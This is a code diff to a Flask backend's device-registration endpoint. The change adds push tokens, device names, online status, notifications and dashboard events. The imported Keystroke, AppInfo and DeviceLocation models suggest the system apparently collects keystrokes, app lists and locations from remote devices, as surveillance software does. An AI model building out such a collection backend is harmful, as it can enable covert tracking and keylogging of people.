@@ -2,7 +2,7 @@ from flask import Blueprint, request, jsonify, Response
 from datetime import datetime
 import requests
 from sqlalchemy.exc import SQLAlchemyError
-from models.devices import Device, DeviceInfo, Keystroke, AppInfo, DeviceLocation
+from models.devices import Device, DeviceInfo, Keystroke, AppInfo, DeviceLocation, DeviceNotification
 from config.database import db
 from logzero import logger
 
@@ -27,21 +27,56 @@ def register_device():
         data = request.get_json()
         device_id = data.get('deviceId')
         device_ip = data.get('deviceIp')
-        
+        fcm_token = data.get('fcmToken')
+        device_name = data.get('deviceName')
 
         if not device_id or not device_ip:
             return jsonify({'error': 'Missing device ID or IP'}), 400
 
         device = Device.query.get(device_id)
+        is_new = device is None
         if device:
             device.device_ip = device_ip
             device.last_seen = datetime.now()
+            device.status = 'online'
+            if fcm_token:
+                device.fcm_token = fcm_token
+            if device_name:
+                device.device_name = device_name
         else:
-            device = Device(device_id=device_id, device_ip=device_ip)
+            device = Device(
+                device_id=device_id,
+                device_ip=device_ip,
+                fcm_token=fcm_token,
+                device_name=device_name,
+                status='online',
+            )
             db.session.add(device)
 
         db.session.commit()
-        return jsonify({'message': 'Device registered successfully'}), 200
+
+        # Create notification
+        msg = f'Device {device_id[:8]} came online ({device_ip})'
+        try:
+            notif = DeviceNotification(device_id=device_id, event_type='device_online', message=msg)
+            db.session.add(notif)
+            db.session.commit()
+        except Exception:
+            db.session.rollback()
+
+        # Emit real-time event to dashboard
+        try:
+            from flask import current_app
+            emit_fn = current_app.config.get('EMIT_EVENT')
+            if emit_fn:
+                emit_fn('device_registered', device.to_dict(), device_id=device_id)
+        except Exception:
+            pass
+
+        return jsonify({
+            'message': 'Device registered successfully',
+            'device': device.to_dict(),
+        }), 200
 
     except SQLAlchemyError as e:
         logger.error(f"Error updating device {device_id}: {str(e)}")
